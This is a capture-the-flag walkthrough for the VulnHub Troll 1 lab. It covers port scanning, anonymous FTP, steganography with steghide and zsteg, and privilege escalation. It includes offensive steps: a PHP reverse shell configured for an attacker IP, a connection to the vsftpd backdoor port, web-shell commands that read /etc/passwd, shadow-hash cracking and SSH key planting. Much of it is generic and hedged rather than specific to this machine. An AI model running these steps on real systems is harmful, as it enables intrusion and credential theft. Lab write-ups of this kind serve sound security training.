# Troll 1: OSCP Walkthrough

**Machine:** Troll 1  
**Download:** [VulnHub: Troll 1](https://www.vulnhub.com/entry/troll-1,46/)  
**Focus:** Steganography, Web, Enumeration  
**Difficulty:** Intermediate  
**Goal:** Obtain `root` access and retrieve the flag  

**Author:** Ankit Patidar (ANKIT48274)

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [Service Enumeration](#2-service-enumeration)
3. [Steganography: Hidden Data Recovery](#3-steganography--hidden-data-recovery)
4. [Web Application Enumeration](#4-web-application-enumeration)
5. [Exploitation](#5-exploitation)
6. [Privilege Escalation](#6-privilege-escalation)
7. [Screenshots](#7-screenshots)
8. [Key Takeaways](#8-key-takeaways)

---

## 1. Reconnaissance & Scanning

### Network Discovery

Identify the target IP on the local network:

```bash
# Netdiscover to find live hosts
sudo netdiscover -r 192.168.1.0/24

# OR
sudo arp-scan --localnet
```

### Initial Nmap Scan

```bash
# Quick port scan to find open ports
nmap -sn 192.168.1.0/24
```

```bash
# Full TCP port scan with service/version detection
nmap -sS -sV -sC -p- --min-rate=1000 -T4 -oN nmap_initial.txt <TARGET_IP>
```

### Basic Nmap Results (Expected)

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4 (or similar)
22/tcp   open  ssh         OpenSSH 7.x
80/tcp   open  http        Apache httpd 2.x
MAC Address: 00:0C:29:XX:XX:XX (VMware)
```

**Key Findings:**
- **FTP on port 21**: potentially anonymous login
- **SSH on port 22**: standard SSH access
- **HTTP on port 80**: web application
- **vsftpd 2.3.4**: known to contain a backdoor (if this version)

---

## 2. Service Enumeration

### FTP Service: Port 21

```bash
# Check FTP banner
nc -nv <TARGET_IP> 21

# Attempt anonymous login
ftp <TARGET_IP>
# Then at the ftp prompt:
# Name (ftp): anonymous
# Password: (just press enter or use your email)
ftp> ls -la
```

### Exploring FTP Content

```bash
# Connect with anonymous credentials
ftp <TARGET_IP>

# Enable passive mode
ftp> passive

# Download everything you find
ftp> mget *

# OR use wget for recursive mirroring
wget -m ftp://anonymous:@<TARGET_IP>/ -o ftp_mirror.log
```

**What to look for on the FTP server:**
- Hidden files and directories (`.` prefix)
- Image files (potential steganography candidates)
- Text files with hints or credentials
- Backups or configuration files

```bash
# List all files including hidden ones (if FTP server allows)
ftp> ls -la
ftp> cd /
ftp> ls -la
```

### Hidden Directory Discovery

```bash
# Check for hidden directories on FTP
ftp <TARGET_IP>
Name (ftp): anonymous
ftp> ls -la
ftp> cd .hidden_dir    (or similar hidden directory name)
ftp> ls -la
```

Look for files like:
- `.hidden/`: common hidden directory name
- Image files that may contain hidden data
- Text files with hints or passwords
- Configuration files

### HTTP Service: Port 80

```bash
# Check HTTP headers and page content
curl -I http://<TARGET_IP>
curl http://<TARGET_IP> | head -50

# Inspect the web page
firefox http://<TARGET_IP>
```

### Web Directory Enumeration

```bash
# Gobuster directory brute-force
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip,bak -t 30 -o gobuster_web.txt

# OR using dirb
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
```

**Key directories to look for:**
- `/uploads/`: common upload directory for web shells
- `/backup/` or `/backups/`: may contain credentials
- `/hidden/`: hidden web directories
- `/images/`: image files (steganography candidates)
- `/admin/`: admin panel

### SSH Service: Port 22

```bash
# SSH version check
nmap -sV -p 22 <TARGET_IP>

# OS fingerprinting
nmap -O <TARGET_IP>
```

### Detailed Nmap Scripts

```bash
# FTP-specific scripts
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-vsftpd-backdoor -p 21 <TARGET_IP>

# HTTP scripts for more detail
nmap --script http-enum,http-title,http-headers,http-server-header -p 80 <TARGET_IP>

# All scripts on common ports
nmap -sC -sV -p 21,22,80 <TARGET_IP>
```

---

## 3. Steganography: Hidden Data Recovery

Steganography is a **primary focus** of this machine. Look in the FTP downloads and web content for image files that may contain hidden data.

### Download and Organize Image Files

```bash
# Create a working directory
mkdir -p ~/Troll1/stego && cd ~/Troll1/stego

# Copy all image files from FTP mirror
cp /path/to/ftp/downloads/*.jpg .
cp /path/to/ftp/downloads/*.png .
```

### Check for Steganography with Steghide

```bash
# Check if steganography is present in a JPEG file
steghide info image1.jpg

# Extract hidden data with a passphrase (common default: "password" or found via enumeration)
steghide extract -sf image1.jpg -p password

# If no passphrase is known, try common defaults
steghide extract -sf image1.jpg -p ""
steghide extract -sf image1.jpg -p stego
steghide extract -sf image1.jpg -p hidden
steghide extract -sf image1.jpg -p secret
```

### Check for Steganography with Stegsolve

```bash
# Launch GUI steg solver (on Kali)
stegsolve &

# OR use command line analysis
# Check LSB (Least Significant Bit) of image
 steghide info -i image_file.jpg
```

### zsteg for Additional Stego Analysis

```bash
# zsteg can find stego that steghide misses
zsteg image1.jpg

# Try all methods
zsteg --all image1.jpg > zsteg_output.txt
```

### Strings Analysis on Image Files

```bash
# Check for embedded strings in image files
strings image1.jpg | grep -i "pass\|key\|secret\|flag\|password\|user\|secret"

# Check for hidden data in binary
strings -n 6 image1.jpg | grep -i "flag\|password\|key\|secret\|hack\|pass"
```

### Check for Multiple Image Layers

Some challenges embed data in multiple layers:

```bash
# Analyze with Exiftool for metadata
exiftool image1.jpg

# Check if image has hidden APP segments
xxd image1.jpg | head -30

# Check for appended data after the JPEG EOF marker
tail -c 1000 image1.jpg | xxd | tail -20
```

### Common Stego File Locations on This Machine

Based on typical Troll 1 deployments:
- Hidden FTP directory `.hidden/`: contains image files with embedded text
- Web uploads directory: contains images with stego data
- Image files directly in web root

### Recover Credentials from Stego

After extracting hidden data from images:

```bash
# The extracted data often contains:
# - Usernames and passwords
# - SSH keys
# - FTP credentials
# - Hints for further exploitation

# Cat the extracted hidden files
cat extracted_data.txt
cat secret_note.txt
cat .hidden_credentials
```

---

## 4. Web Application Enumeration

### Detailed Web App Analysis

```bash
# Check what the web page contains
curl -s http://<TARGET_IP> | grep -i "login\|password\|form\|input\|admin"

# Check for common CMS indicators
curl -s http://<TARGET_IP> | grep -i "generator\|powered\|cms\|wordpress\|joomla\|drupal"
```

### Additional Nmap Web Enumeration

```bash
# Check for robots.txt
curl http://<TARGET_IP>/robots.txt

# Check for common hidden files
curl http://<TARGET_IP>/.htaccess
curl http://<TARGET_IP>/.htpasswd
curl http://<TARGET_IP>/.htpasswd_backup

# Check for web backups
curl -I http://<TARGET_IP>/backup.zip
curl -I http://<TARGET_IP>/backup.tar.gz
curl -I http://<TARGET_IP>/config.php.bak
```

### Gobuster Extended Scan with Extensions

```bash
# Scan with many common extensions
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,old,zip,tar.gz,php,html,txt,config -t 30 -o gobuster_extended.txt
```

### Sniffing Credentials on HTTP Traffic

If the web page has login forms over plain HTTP:

```bash
# Use Burp Proxy to intercept and analyze
# Or simply check the login form
curl -s http://<TARGET_IP> | grep -A 10 "form\|input"
```

---

## 5. Exploitation

### Method 1: FTP Credential-Based Access

If credentials were found via steganography or FTP anonymous access:

```bash
# Test the discovered credentials on the FTP server
ftp <TARGET_IP>
# Name: <username>
# Password: <password_from_stego>
ftp> ls -la
ftp> cd /
ftp> find . -type f -name "*.txt"
```

### Method 2: Web Exploitation

Find the vulnerability on the web application:

```bash
# Check for upload functionality
# Browse to any file upload forms found during directory enumeration
# The goal is often to upload a PHP web shell
```

### Uploading a PHP Reverse Shell

If file upload is possible:

```bash
# Download a PHP reverse shell (from pentestmonkey or securetheblogs)
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

# Edit the IP and port
sed -i 's/127.0.0.1/<ATTACKER_IP>/g' shell.php
sed -i 's/1234/<LISTEN_PORT>/g' shell.php

# Start listener on attacking machine
nc -nvlp <LISTEN_PORT>

# Upload the shell via the web application interface
# Then access it:
curl http://<TARGET_IP>/uploads/shell.php
```

### Method 3: SSH Access with Credentials from Stego

```bash
# Use credentials discovered via steganography
ssh <username>@<TARGET_IP>
# Password: <password_found_in_stego>
```

### Method 4: vsftpd Backdoor (if version 2.3.4)

If the FTP service is running vsftpd 2.3.4 (a known backdoor version):

```bash
# The backdoor opens a shell on port 6200
# Connect to the backdoor port
nc <TARGET_IP> 6200

# You should get a shell immediately
whoami
id
```

### Method 5: SSH Tunneling through Web Shell

If you only got a web shell but need SSH-like access:

```bash
# Through the PHP shell, create an SSH tunnel or reverse shell
# Execute commands directly
curl "http://<TARGET_IP>/uploads/shell.php?cmd=whoami"
curl "http://<TARGET_IP>/uploads/shell.php?cmd=id"
curl "http://<TARGET_IP>/uploads/shell.php?cmd=cat /etc/passwd"
```

---

## 6. Privilege Escalation

Once inside as a low-privilege user, enumerate for privilege escalation paths:

### Sudo Permissions Check

```bash
sudo -l
```

### SUID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

### Sudo Rights Enumeration

```bash
# Check all sudo rights
sudo -l 2>&1

# Check sudo version (relevant for exploits)
sudo -V
```

### Password Hashes and Credential Abuse

```bash
# Check if there are other user hashes
cat /etc/shadow
# If accessible, crack with john
john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt

# Try sudo with extracted passwords
sudo -l
sudo su -
```

### Check for Credential Reuse

In many CTF machines, credentials found in steganography also work for:
- `sudo` access
- SSH as another user
- Logging into services as root

```bash
# Try the stego-found credentials
sudo -S -l <<< "<password_from_stego>"
```

### Common Escalation Paths on Troll 1

1. **SSH authorized_keys**: Check for writable SSH key files
```bash
# Check if you can add your SSH key
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys

# If writable, add your public key
echo "<YOUR_PUBLIC_KEY>" >> ~/.ssh/authorized_keys
ssh <TARGET_IP>  # Connect with your private key
```

2. **Cron jobs**: Look for scripts run as root
```bash
# Check all cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
cat /etc/cron.daily/*
cat /etc/cron.hourly/*

# Find world-writable scripts
find / -writable -type f -name "*.sh" 2>/dev/null
```

3. **GTFOBins** reference for common binaries
```bash
# Check GTFOBins for SUID binaries found
# Common GTFOBins: vim, find, less, more, nano, cp, mv, etc.
```

4. **Kernel exploits**
```bash
uname -r
# Search for relevant kernel exploits on GTFOBins or Exploit-DB
```

5. **Password reuse** for sudo
```bash
# Often the FTP/web credentials work for sudo directly
echo "<password>" | sudo -S -l
echo "<password>" | sudo -S cat /root/root.txt
```

### Getting Root

```bash
# Once a root shell is obtained
cat /root/root.txt
echo "Root flag captured:"
cat /root/root.txt
```

---

## 7. Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap scan results (21, 22, 80) | *[Image: Nmap Scan]* |
| FTP anonymous login & directory listing | *[Image: FTP Anonymous]* |
| Hidden directory on FTP server | *[Image: Hidden Dir]* |
| Steganography analysis with steghide | *[Image: Steghide]* |
| zsteg output revealing hidden credentials | *[Image: zsteg]* |
| Strings analysis on image files | *[Image: Strings]* |
| Web page & directory enumeration | *[Image: Web Enum]* |
| Root shell with root.txt captured | *[Image: Root Shell]* |

---

## 8. Key Takeaways

1. **Steganography is a primary focus**: In CTF machines with a steganography focus, always check image files with `steghide`, `zsteg`, and `strings`. The hidden data often contains critical credentials.
2. **Anonymous FTP is a common entry point**: Always check FTP for anonymous access. Even without login, the directory listing may reveal hidden files containing clues.
3. **Hidden directories matter**: Look for dot-prefixed directories (`.` prefix) both on FTP and on the web server. Many CTF challenges hide data in obscure places.
4. **Don't ignore image files**: Even if images appear irrelevant for web exploitation, they may contain hidden data that gives you credentials for SSH or other services.
5. **Credentials often reuse across services**: A password extracted from steganography may work for SSH, sudo, or the web admin panel.
6. **Image metadata is valuable**: Use `exiftool` to check image metadata for hidden clues: filenames, comments, or GPS coordinates often contain hints.
7. **Layer-by-layer approach**: Stego challenges often require multiple layers of decoding. Don't stop after the first extraction; check the output for more hidden content.

---

*M4d3 w1th ❤️ by Ankit Patidar*
